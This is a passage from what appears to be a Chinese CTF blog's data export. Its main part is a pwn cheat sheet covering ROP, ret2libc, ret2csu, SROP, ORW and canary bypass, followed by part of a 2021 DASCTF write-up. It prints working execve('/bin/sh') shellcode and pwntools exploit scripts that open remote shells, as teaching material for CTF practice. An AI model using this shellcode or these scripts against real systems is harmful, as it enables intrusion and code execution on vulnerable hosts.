f.write(bin)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"}],"tags":[{"name":"格式化字符串","slug":"格式化字符串","permalink":"https://lazzzaro.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"}],"author":"Lazzaro"},{"title":"堆","slug":"pwn-堆","date":"2021-08-08T09:59:44.000Z","updated":"2024-03-14T15:39:52.590Z","comments":true,"path":"2021/08/08/pwn-堆/","permalink":"https://lazzzaro.github.io/2021/08/08/pwn-%E5%A0%86/","excerpt":"","text":"​ 堆 ​ UAF（预留） ​ double free（预留） ​ bin攻击fastbin attack（预留） ​ unsorted bin attack（预留） ​ largebin attack（预留） ​ tcache attack（预留） ​ off by攻击off by one（预留） ​ off by null（预留） ​ _IO_FILE（预留） ​ unlink（预留） ​ house of系列house of force（预留） ​ house of spirit（预留） ​ house of einherjar（预留） ​ house of roman（预留） ​ house of orange（预留） ​ house of lore（预留） ​ house of rabbit（预留） ​ house of kiwi（预留） ​ house of banana（预留） ​ house of apple（预留） ​ house of cat（预留） ​ house of emma（预留） ​","categories":[{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"}],"tags":[{"name":"堆","slug":"堆","permalink":"https://lazzzaro.github.io/tags/%E5%A0%86/"}],"author":"Lazzaro"},{"title":"栈","slug":"pwn-栈","date":"2021-08-08T09:59:35.000Z","updated":"2025-02-19T10:39:43.367Z","comments":true,"path":"2021/08/08/pwn-栈/","permalink":"https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%88/","excerpt":"","text":"​ 基础文件描述符0代表stdin，1代表stdout，2代表stderr。如果此时再打开一个新文件，那么文件描述符就是3。 dup2 可以用参数newfd指定新文件描述符的数值。若参数newfd已经被程序使用，则系统就会将newfd所指的文件关闭，若newfd等于oldfd，则返回newfd，而不关闭newfd所指的文件。dup2 所复制的文件描述符与原来的文件描述符共享各种文件状态，共享所有的锁定，读写位置和各项权限或flags等。 ​ ROPROP（Return-Oriented Programming, 返回导向编程） 通过栈溢出的漏洞，覆盖return address，从而达让直行程序反复横跳的一种技术。 静态生成ROPchain： ROPgadget --binary [file] --ropchain ropper --file [file] --chain execve ​ ret2syscall系统调用号查询：https://syscalls.w3challs.com/ 32位调用约定：系统调用号 $eax，参数：$ebx/$ecx/$edx/$esi/$edi/$ebp，调用 int 0x80。 调用 execve(&quot;/bin/sh&quot;, 0, 0)： 1234567891011# $eax = 0xb = 11ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep eax# $ebx = [&quot;/bin/sh&quot;]ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep ebxROPgadget --binary vuln --string &quot;/bin/sh&quot;# $ecx = 0ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep ecx# $edx = 0ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep edx# int 0x80ROPgadget --binary vuln --only &quot;int&quot; 64位调用约定：系统调用号 $rax，参数：$rdi/$rsi/$rdx/$rcx($r10)/$r8/$r9，调用 syscall。 调用 execve(&quot;/bin/sh&quot;, 0, 0)： 1234567891011# $rax = 0x3b = 59ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep rax# $rdi = [&quot;/bin/sh&quot;]ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep rdiROPgadget --binary vuln --string &quot;/bin/sh&quot;# $rsi = 0ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep rsi# $rdx = 0ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep rdx# syscallROPgadget --binary vuln --only &quot;syscall&quot; ​ ret2shellcodeshellcode数据库： Shellcodes database for study cases 常用shellcodepwntools 123# pwntoolscontext.arch = elf.archshellcode = asm(shellcreaft.sh()) 32位 12345678910111213141516171819202122232425262728293031323334353637383940# othershellcode = asm(&#x27;&#x27;&#x27;push eax pop ebx push edx pop eax dec eax xor al,0x46 xor byte ptr[ebx+0x35],al #set int 0x80 xor byte ptr[ebx+0x36],al push ecx pop eax xor al, 0x41 xor al, 0x40 push ecx pop eax xor al, 0x41 xor al, 0x40 push ecx pop eax xor al, 0x41 xor al, 0x40 push ecx # set al=0xb pop eax xor al, 0x41 xor al, 0x40 push edx # set ecx=0 pop ecx push 0x68 # push /bin/sh push 0x732f2f2f push 0x6e69622f push esp pop ebx&#x27;&#x27;&#x27;) # other# 21 bytes&#x27;\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80&#x27;# ascii&#x27;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA&#x27;# for scanf&#x27;\\xeb\\x1b\\x5e\\x89\\xf3\\x89\\xf7\\x83\\xc7\\x07\\x29\\xc0\\xaa\\x89\\xf9\\x89\\xf0\\xab\\x89\\xfa\\x29\\xc0\\xab\\xb0\\x08\\x04\\x03\\xcd\\x80\\xe8\\xe0\\xff\\xff\\xff/bin/sh&#x27; 64位 1234567891011121314151617# read(0,0xcafe0000,0x1000)shellcode = asm(&quot;&quot;&quot; xor eax, eax /* SYS_read */ xor edi, edi /* 0 */ mov edx, 0x1000 mov esi, 0xcafe0000 syscall&quot;&quot;&quot;)# other# 23 bytes&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&#x27;&#x27;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&#x27;# ascii&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;# for scanf&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&#x27; shellcode限制可见字符构造一些xor操作，通过xor的操作对寄存器赋值。 工具： AE64、alpha3、shellcode_encoder 参考： MRCTF 2020 - shellcode_revenge NSSRound#4 - 百密一疏 1 2 3 NewStarCTF 2023 - shellcode revenge [原创]可见shellcode字符的艺术 shellcode题目整理 更多限制函数 __ctype_b_loc() 如 if ( ((*__ctype_b_loc())][s[i]] &amp; 0x4000) == 0 &amp;&amp; s[i] != 10) &#123;&#125; 见 ctype/ctype.h 源码，作用为将输入的字符根据 ((bit) &lt; 8 ? ((1 &lt;&lt; (bit)) &lt;&lt; 8) : ((1 &lt;&lt; (bit)) &gt;&gt; 8)) 进行处理，然后根据下面表对应的结果进行返回。 参考：2021 天翼杯 - ezshell ​ ret2libcPatial RELRO下，调⽤库函数⼀次之后，GOT表中会存放libc相关地址。 libc数据库https://libc.blukat.me/ https://libc.rip/ https://libc.nullbyte.cat/ glibc-all-in-one 板子查gadget： ROPgadget --binary [file] --only &quot;pop|ret&quot; | grep &quot;xxx&quot; ropper --file [file] --search &quot;xxx&quot; 给定libc1234567891011121314151617181920212223242526272829# x64from pwn import *r = remote(&#x27;x.x.x.x&#x27;, 22222)# r = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so&#x27;)write_plt = elf.plt.writewrite_got = elf.got.writemain_addr = elf.sym.mainpop_rdi = 0x401233pop_rsi = 0x401231pl = &#x27;a&#x27;*(0x80+8)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(write_got)+p64(0)+p64(write_plt)+p64(main_addr)p.sendline(pl)write_addr = u64(r.recv(6).ljust(8,&#x27;\\x00&#x27;))# 或 write_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))print(hex(write_addr))libc_base = write_addr-libc.sym.writeprint(hex(libc_base))system_addr = libc_base+libc.sym.systembinsh_addr = libc_base+libc.search(&#x27;/bin/sh&#x27;).next()pl = &#x27;a&#x27;*(0x80+8)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)p.sendline(pl)p.interactive() 使用LibcSearcherLibcSearcher项目: LibcSearcher、LibcSearcher_plus 12345678910111213141516171819202122232425262728# x64from pwn import *from LibcSearcher import *r = remote(&#x27;x.x.x.x&#x27;, 22222)elf = ELF(&#x27;./pwn&#x27;)pop_rdi_ret = 0x400c83ret = 0x4006b9puts_plt = elf.plt.putsputs_got = elf.got.putsmain_addr = elf.sym.mainpayload = &#x27;a&#x27;*0x58 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)r.sendline(payload)puts_addr = u64(r.recv(6).ljust(0x8, b&#x27;\\x00&#x27;))# 或 puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)print(libcbase)sys_addr = libcbase + libc.dump(&#x27;system&#x27;)bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)payload = &#x27;a&#x27;*0x58 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)r.sendline(payload)r.interactive() one_gadget查找已知的libc中 exevce(&quot;/bin/sh&quot;) 语句的地址： one_gadget libc.so 123456789101112131415161718192021222324252627# x64from pwn import *r = remote(&#x27;x.x.x.x&#x27;, 22222)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so&#x27;)pop_rdi_ret = 0x400c83ret = 0x4006b9puts_plt = elf.plt.putsputs_got = elf.got.putsmain_addr = elf.sym.mainpayload = &#x27;a&#x27;*0x58 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)r.sendline(payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))print(hex(puts_addr))libc_base = puts_addr - libc.sym.puts#one_gadget libc.soexecve_addr = libc_base + 0x10a38cpayload = &#x27;a&#x27;*0x58 + p64(execve_addr)r.sendline(payload)r.interactive() ​ ret2csu在x64中，如果遇到函数调用需要传入3个参数，分别依赖rdi/rsi/rdx三个寄存器，但通过ROPgadget无法找到相关的寄存器利用链，这时就要开始考虑通过调用__libc_csu_init函数来实现传递3个参数的效果，这种实现方式，称为 ret2csu。 gadget1 部分： 1234567400610 pop rbx # 必须为 0400613 pop rbp # 必须为 1400616 pop r12 # call（由于下面 call 指令的寻址方式为间接寻址，所以此处应为got表地址）400619 pop r13 # arg340061d pop r14 # arg2400621 pop r15 # arg1400624 retn # to gadget2 gadget2 部分： 123456789101112131415400610 mov rdx, r13 # 传入第三个参数rdx400613 mov rsi, r14 # 传入第二个参数rsi400616 mov edi, r15 # 传入第一个参数rdi400619 call qword ptr [r12+rbx*8] call # 此时 rbx=0 ，r12=func_got,call[r12]=call func40061d add rbx, 1400621 cmp rbx, rbp400624 jnz short loc_400880400626 add rsp, 8 # padding40062a pop rbx # padding40062b pop rbp # padding40062c pop r12 # padding40062e pop r13 # padding400630 pop r14 # padding400632 pop r15 # padding400634 retn ——&gt; # 构造padding(7*8=56byte)就返回 ROP链： 12345678910111213141516gadget1_addr0 (must)1 (must)write_got0x10 (write_arg3_size)write_got (write_arg2_buf)1 (write_arg1_fd)gadget2_addrAAAAAAAA (填充 add rsp, 8)AAAAAAAA (填充 pop rbx)AAAAAAAA (填充 pop rbp)AAAAAAAA (填充 pop r12)AAAAAAAA (填充 pop r13)AAAAAAAA (填充 pop r14)AAAAAAAA (填充 pop r15)0xffffffffffffffff (ret) 参考： 关于学习ret2csu的总结 Linux x64 下的万能 Gadget ​ ret2dl_resolve前提：Patial RELRO 思路： 伪造 link_map-&gt;l_addr 为libc中已解析函数与想要执行的目标函数的偏移值，如 addr_system-addr_xxx 伪造 sym-&gt;st_value 为已经解析过的某个函数的 got 表的位置 也就是相当于 value = l_addr + st_value = addr_system - addr_xxx + real_xxx = real_system 参考： ret2dlresolve超详细教程(x86&amp;x64) ​ 其他姿势栈迁移在一般的栈溢出攻击时，有一个前提条件是“有充分的栈空间用来布局”，通常我们会在栈的剩余空间上存放一些恶意指令。但是当栈的剩余空间很小时，例如只可覆盖ebp和ret，一般的栈溢出思路就无法完成攻击。 不过既然栈上没有足够的空间供我们布置，那我们可以尝试找另一块空间来进行布局，然后将栈指针esp劫持到这里就能完成攻击，这就是”栈迁移“的基本思想。 如图所示，当主调函数调用func函数时： 执行push eip+4将调用语句的下一条语句保存到栈上，用来在函数返回时跳转到返回地址（ret） PC指向func函数的地址 在执行func函数前： func会先将ebp寄存器中的值保存到栈上，用于在函数返回时还原ebp为主调函数的栈底。 函数执行完毕，返回，会执行leave ret这两条语句 leave相当于mov esp,ebp（把栈指针指向栈底，销毁栈帧）、pop ebp（还原ebp为主调函数的栈底）。 ret相当于pop eip（把栈上保存的返回地址存入eip寄存器） 从这里可以知道，ebp的值可以控制esp，但是leave指令是先mov esp,ebp后pop ebp，看上去没有办法通过修改栈上保存的ebp改变esp的值，不过不要忘记我们还可以控制ret的值，如果把ret覆盖为leave ret的地址，我们覆盖的假ebp就可以通过两次leave语句到esp寄存器上，从而完成了栈迁移。 思路： 利用第一次输入泄露出ebp地址，再利用第二次输入构造一个栈，将esp劫持到我们构造的栈上，再把栈上的返回地址改为system函数的地址，这样就模拟出了一次system(&quot;/bin/sh&quot;)的调用。 例： 1234pay = p64(pop_rdi_ret) + p64(binsh) + p64(libc.sym[&quot;system&quot;])pay = pay.ljust(0x50, b&#x27;\\x00&#x27;)pay += p64(rop_addr - 8)pay += p64(leave_ret) 参考： 栈迁移详解 ciscn_2019_es_2 ​ 特殊系统调用mprotect将内存页的权限修改为可读可写可执行。 需要注意的是指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。 12345678910111213141516171819#include &lt;sys/mman.h&gt;int mprotect(void *addr, size_t len, int prot);/*addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB == 4096字节）整数倍。len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用：1）PROT_READ：内存段可读；2）PROT_WRITE：内存段可写；3）PROT_EXEC：内存段可执行；4）PROT_NONE：内存段不可访问。返回值：0；成功，-1；失败（并且errno被设置）1）EACCES：无法设置内存段的保护属性。当通过 mmap(2) 映射一个文件为只读权限时，接着使用 mprotect() 标志为 PROT_WRITE这种情况就会发生。2）EINVAL：addr不是有效指针，或者不是系统页大小的倍数。3）ENOMEM：内核内部的结构体无法分配。这里的参数prot： r:4 w:2 x:1prot为7（1+2+4）就是rwx可读可写可执行，与linux文件属性用法类似。 */ getdents64读取目录结构。 int getdents(unsigned int fd, struct linux_dirent *dirp,unsigned int count); 参数一：fd指针 参数二：写入的内存区域 参数三：4096 功能：把当前文件目录下的文件名写入参数二指向的内存区域 该函数是一个解析文件夹的函数，第一个参数时要解析的文件句柄，第二个参数是存放解析数据的位置，count是dirp的大小，通过这个我们就可以解析文件夹，需要注意的是当打开文件夹时open的第二个参数为0x10000,打开文件时的参数为0。 返回结构体： 1234567struct linux_dirent64 &#123; ino64_t d_ino; /* 64-bit inode number */ off64_t d_off; /* 64-bit offset to next structure */ unsigned short d_reclen; /* Size of this dirent */ unsigned char d_type; /* File type */ char d_name[]; /* Filename (null-terminated) */&#125;; alarmalarm 函数有一个特点，它可以通过偏移来获取一个 syscall。如果能让 alarm 函数的 got表的值加上一个偏移量，则可以通过调用 alarm 函数来获得一个 syscall。 ​ orworw 方式，即 open-read-write，通过文件操作直接获取文件内容。 查找 syscall; ret 的 gadget方法 用 opcode 功能搜 123from pwn import *print(asm(&#x27;syscall;ret&#x27;).encode(&#x27;hex&#x27;))# 0f05c3 ROPgadget搜索 ROPgadget --binary libc-2.31.so --opcode 0f05c3 shellcodepwntools 123456789101112# pwntoolsshellcode = &#x27;&#x27;shellcode += shellcraft.open(&#x27;./flag&#x27;)shellcode += shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,0x100)shellcode += shellcraft.write(1,&#x27;esp&#x27;,0x100)payload = asm(shellcode)shellcode = b&quot;\\x90&quot; * 0x100shellcode += shellcraft.open(&quot;/flag&quot;)shellcode += shellcraft.read(3, 0xCAFE0500, 0x500)shellcode += shellcraft.write(1, 0xCAFE0500, 0x500)payload = asm(shellcode) 32位 1234567891011121314151617181920shellcode = &quot;&quot;&quot; /*open(./flag)*/ push 0x1010101 xor dword ptr [esp], 0x1016660 push 0x6c662f2e mov eax,0x5 mov ebx,esp xor ecx,ecx int 0x80 /*read(fd,buf,0x100)*/ mov ebx,eax mov ecx,esp mov edx,0x30 mov eax,0x3 int 0x80 /*write(1,buf,0x100)*/ mov ebx,0x1 mov eax,0x4 int 0x80 &quot;&quot;&quot; 64位 123456789101112131415161718192021shellcode = asm(&#x27;&#x27;&#x27; /*open(./flag)*/ push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall /*read(fd,buf,0x100)*/ mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall /*write(1,buf,0x100)*/ mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;) ROP链open 1234567891011# open(&quot;.&quot;)payload += p64(pop_rax_ret)payload += p64(2)payload += p64(pop_rdi_ret)payload += p64(bss_addr)payload += p64(pop_rsi_ret)payload += p64(0)payload += p64(pop_rdx_r12_ret)payload += p64(0)payload += p64(0)payload += p64(syscall_ret) read 123456789# read(0, bss_addr, 2)payload += p64(pop_rdi_ret)payload += p64(0)payload += p64(pop_rsi_ret)payload += p64(bss_addr)payload += p64(pop_rdx_r12_ret)payload += p64(2)payload += p64(0)payload += p64(elf.sym[&#x27;read&#x27;]) write 1234567891011# write(1, bss_addr + 0x200, 0x600)payload += p64(pop_rax_ret)payload += p64(1)payload += p64(pop_rdi_ret)payload += p64(1)payload += p64(pop_rsi_ret)payload += p64(bss_addr + 0x200)payload += p64(pop_rdx_r12_ret)payload += p64(0x600)payload += p64(0)payload += p64(syscall_ret) seccomp保护 / sandbox特征：在 sandbox 函数中看到⼤量的赋值语句，最后调⽤了 prctl。 查看限制：seccomp-tools dump ./pwn 禁用o代替 2-open： 32/64通用：257-openat 禁用r代替 0-read： 32位：515-readv，534-preadv，546-preadv2 64位：19-readv，295-preadv，327-preadv2 禁用w代替 1-write： 32位：516-writev，535-pwritev，547-pwritev2 64位：20-writev，296-pwritev，328-pwritev2 代替 read+write： 32/64通用：40-sendfile 禁用x代替 59/520-execve： 32位：545-execveat 64位：322-execveat ​ magic gadgetsadd dword ptr [rbp - 0x3d], ebx ; nop ; ret它会将 rbp - 0x3d 所代表的内存处的数值增加 ebx。结合ret2csu，rbp和ebx是很容易控制的，可以实现任意内存地址写。 ​ 保护ALSRASLR 的是操作系统的功能选项，作用于 executable（ELF）装入内存运行时，因而只能随机化 stack、heap、libraries 的基址。 ​ NXNo-Execute（不可执行），NX 的原理是将数据所在内存页标识为不可执行，当程序执行流被劫持到栈上时，程序会尝试在数据页面上执行指令，因为数据页被标记为不可知性，此时CPU就会抛出异常，而不是去执行栈上数据。 ​ canary金丝雀保护，是一种用来防护栈溢出的保护机制。其原理是在函数入口处，先从 fs/gs 寄存器中取出一个 4(eax)/8(rax) 字节的 cookie 信息存到栈上，当函数结束返回的时候会验证 cookie 信息是否合法(与开始存的是否一致)，如果不合法就停止程序运行。真正的 cookie 信息也会保存在程序的某个位置。插入栈中的 cookie 一般在 ebp / rbp 之上的一个内存单元保存。 常用泄露方法：覆盖低位canary的0带出来canary。 Stack smash / ssp攻击通过 __stack_chk_fail() 函数打印报错信息来实现。 据 __stack_chk_fail() 源码，报错信息中会打印出libc_argv[0]的值，而libc_argv[0]指向的则是程序名。若能够栈溢出足够的长度，覆盖到__libc_argv[0]的位置，就能让程序打印出任意地址的数据，造成任意地址数据泄露。 覆盖 __stack_chk_fail() 为后门函数或 main() 函数。 TLS 线程局部存储 (TLS) 是一种存储持续期（storage duration），对象的存储是在线程开始时分配，线程结束时回收，每个线程有该对象自己的实例。 TLS 具有 TCB 结构体。也就是说对于 TLS 的变量，每个线程都会有自己独有的一份，既然维护 canary 的 TCB 结构体是 TLS 的，就不能想到这个结构体必然会在线程自己申请的空间里面，并且在作比较时也是和自己独有的那一份比较的。TCB 结构体是是以 fs 作为基址索引的，TCB 结构体的定义： 12345678910111213141516171819202122232425262728typedef struct&#123; void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; uintptr_t pointer_guard; unsigned long int vgetcpu_cache[2]; /* Bit 0: X86_FEATURE_1_IBT. Bit 1: X86_FEATURE_1_SHSTK. */ unsigned int feature_1; int __glibc_unused1; /* Reservation of some values for the TM ABI. */ void *__private_tm[4]; /* GCC split stack support. */ void *__private_ss; /* The lowest address of shadow stack, */ unsigned long long int ssp_base; /* Must be kept even if it is no longer used by glibc since programs, like AddressSanitizer, depend on the size of tcbhead_t. */ __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32))); void *__padding[8];&#125; tcbhead_t; 在 gdb 里面看 fs 附近的内存分布情况，使用 fsbase 查看 fs 的值，内存分布和结构体定义一致，所以 fs 就是指向 TCB 结构体，vmmap 一下会发现 TCB 是存在栈上的，而且显然建立的时间在 test_thread 之前，又由于可以栈溢出接近 0x1000 个字节，完全可以覆写 TCB 结构体，把 TCB 的 stack_guard 字段写成比如 p64(0)，那么溢出到 canary 的时候覆写成 0 就可以 bypass canary。 ​ PIEPIE（Position Independent Executables）是编译器（gcc，…）功能选项（-fPIE / -fpie），作用于编译过程，可将其理解为特殊的 PIC（so专用，Position Independent Code），加了 PIE 选项编译出来的 ELF 用 file 命令查看会显示其为 so，其随机化了 ELF 装载内存的基址（代码段、plt、got、data 等共同的基址）。其效果为用 objdump、IDA 反汇编之后的地址是用偏移表示的而不是绝对地址。 ELF是按页对齐，一页是0x1000，所以低三位十六进制的值不会改变。 ​ RELRORELRO（ReLocation Read-Only），堆栈地址随机化， 是一种用于加强对 binary 数据段的保护的技术。 Partial RELRO ，GOT 部分的非 PLT 部分（来自 readelf 输出的 .got）是只读的，但 .got.plt 仍然是可写的。 Full RELRO，整个 GOT（.got 和 .got.plt）都被标记为只读。 GOT全称 Global Offset Table 全局偏移表。“.got.plt” 是GOT的一部分，另一部分是 “.got”。“.got”存放全局变量引用地址。”.got.plt”存放函数引用地址。 ​ SROP移栈构造所需字符串，进行srop，调用execve。 例： 123456789frame=SigreturnFrame()frame.rdi=59frame.rsi=bss-0x30frame.rdx=0frame.rcx=0frame.rsp=bss+0x38frame.rip=syscallp.send(b&#x27;/bin/sh\\x00&#x27;+b&#x27;a&#x27;*0x30+flat(rdi,0xf,syscall,frame)) ​ BROP（预留） ​ 其他泄露方法stdout leak（待补充） ​ _environ在libc中保存了一个函数 _environ，存的是当前进程的环境变量，它储存在libc中，是沟通libc地址与栈地址的桥梁。通过libc找到environ地址后，泄露environ地址处的值，可以得到环境变量地址，环境变量保存在栈中，通过偏移可以得到栈上任意变量的地址。 ​ scanfscanf有个特性，当输入非法数据时，比如输入非数字，它不会覆盖原本参数的所在地址上的数据，从而利用后面的格式化字符串来打印出栈上数据。 ​ 随机数（srand+rand）glibc随机数发生器 使用python的ctype库，LoadLibrary，导入libc.so.6。使用方法类似C的LoadLibrary，但是不用创建函数指针，已经封装好了。 12345678910111213from pwn import *from ctypes import *s = remote(&quot;ip&quot;,&quot;port&quot;)libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)libc.srand(libc.time(0))for i in range(50): rand = str(libc.rand()%6+1) s.sendline(rand)s.interactive() ​ 限制绕过关闭输出close(1); =&gt; exec 1&gt;&amp;0 或 exec 1&gt;&amp;2 ​ 时间侧信道基于时间的侧信道攻击，在检查验证码时，正确的位数越多，延迟的时间就越长。故可以从时间的角度判断该位验证码是否正确。 参考： NewStarCTF 2023 Week5 - login","categories":[{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"}],"tags":[{"name":"栈","slug":"栈","permalink":"https://lazzzaro.github.io/tags/%E6%A0%88/"}],"author":"Lazzaro"},{"title":"2021DASCTF July X CBCTF 4th","slug":"match-2021DASCTF-July-X-CBCTF-4th","date":"2021-08-01T10:13:02.000Z","updated":"2021-08-02T15:57:40.821Z","comments":true,"path":"2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/","permalink":"https://lazzzaro.github.io/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/","excerpt":"","text":"​ 2021 DASCTF实战精英夏令营预热赛DASCTF July x CBCTF 4th主办单位: 安恒信息、杭州电子科技大学网络空间安全学院竞赛时间: 2021年7月31日10:00- 2021年8月1日18:00报名时间: 2021年7月15日10:00-2021年7月31日10:00报名地址: https://buuoj.cn/das报名方式: 登录后点击[个人信息]完善个人信息&gt;点击[参与情况]创建战队-&gt;分享战队Token给自己的队员-&gt;等待比赛开始竞赛方式: 团队赛(最多三人一组)命题战队: 0rays Rank: 42 CRYPTOYusa的密码学签到——BlockTrick 好久不见，上课前先签个到叭！此题 nc 连接。 123456789101112131415161718192021222324252627from Crypto.Cipher import AESimport osdef pad(a): size = (16-len(a)%16)%16 a += chr(size)*size return aiv = os.urandom(16)key = os.urandom(16)enc = AES.new(key,AES.MODE_CBC,iv)print(iv.encode(&#x27;hex&#x27;))for _ in range(2): try: trick = raw_input(&quot;&quot;) trick = pad(trick.decode(&#x27;hex&#x27;)) cipher = enc.encrypt(trick) if trick == cipher and trick != &quot;&quot; : with open(&quot;flag.txt&quot;) as f: print(f.read()) exit() else: print(cipher.encode(&#x27;hex&#x27;)) print(&quot;Try again&quot;) except: exit() AES-CBC模式原理。 第一次： 令 P0 = IV C0 = Encrypt(P0 XOR IV) = Encrypt(0) 第二次： 令 P1 = C0 C1 = Encrypt(P1 XOR C0) = Encrypt(C0 XOR C0) = Encrypt(0) = C0 = P1 ​ MISCred_vs_blue 红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？ nc连接 同一次连接内，错误可以反复从头猜，66次随机结果不变，存储之前猜对的正确结果，错误时再重猜当前次数的另一种结果即可。 123456789101112131415161718192021222324252627282930313233from pwn import *r=remote(&#x27;node4.buuoj.cn&#x27;,29203)r.recvline()r.recvline()r.recvline()ans=[&#x27;?&#x27;]*67i=1while i&lt;=66: print(r.recvline()) r.recvline() if ans[i]==&#x27;?&#x27;: r.sendline(&#x27;r&#x27;) r.recvline() r.recvline() x=r.recvline() if &#x27;success&#x27; in x: ans[i]=&#x27;r&#x27; i+=1 elif &#x27;Sorry&#x27; in x: ans[i]=&#x27;b&#x27; r.sendlineafter(&#x27;Play again? (y/n): &#x27;,&#x27;y&#x27;) i=1 else: r.sendline(ans[i]) r.recvline() r.recvline() r.recvline() i+=1 print(ans)print(r.recvall()) ​ funny_maze 七月被困在了迷宫里，十秒后迷宫的终点就要永远消失了，你能帮她走出迷宫吗？ nc 连接 DFS算法走迷宫。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from pwn import *p=remote(&#x27;node4.buuoj.cn&#x27;,27139)def get_sol(maze): if len(path) &gt; 0: print(&#x27;\\n&#x27;.join(&#x27;&#x27;.join(row) for row in maze)) solution = &#x27;&#x27;.join(path)[::-1] print(solution) global path path = [] return solutiondef dfs(maze, y, x): if maze[y][x] in (&#x27; &#x27;,&#x27;S&#x27;): tag = &#x27;o&#x27; maze[y][x] = tag if dfs(maze, y, x+1) == True: tag = &#x27;R&#x27; path.append(tag) elif dfs(maze, y+1, x) == True: tag = &#x27;D&#x27; path.append(tag) elif dfs(maze, y, x-1) == True: tag = &#x27;L&#x27; path.append(tag) elif dfs(maze, y-1, x) == True: tag = &#x27;U&#x27; path.append(tag) else: tag = &#x27; &#x27; maze[y][x] = tag return (tag != &#x27; &#x27;) elif maze[y][x] == &#x27;E&#x27;: return True return Falsefor i in range(5): p.recvline()p.sendline(&#x27;1&#x27;)while 1: maze = [] first = p.recvline().strip() if &#x27;#&#x27; not in first: print(first) print(p.recvall()) break leng = len(first) maze.append(list(first)) for i in range(leng-1): now = p.recvline().strip() maze.append(list(now)) start = [] for y in range(0,len(maze)): for x in range(0,len(maze[y])): if maze[y][x] == &#x27;S&#x27;: start = [y,x] path = [] dfs(maze, start[0], start[1]) sol = get_sol(maze) print(sol) p.recvline() p.sendline(str(len(sol)+1)) p.recvline() p.recvline() p.recvline() ​ ezSteganography 有手就行的隐写 10M+ png图。 zsteg在G通道发现隐写另一png图，文字只有一半flag： 查找QIM算法： 量化索引调制算法(QIM)是一种经典的水印算法，它根据水印信息，把原始载体数据用量化器量化到不同的索引区间，能在获取较高的鲁棒性同时，具有较小嵌入失真。QIM算法能有效抵抗滤波、噪声、剪切等常见攻击。 找到具体实现代码，将输入从一维修改为二维图像矩阵： 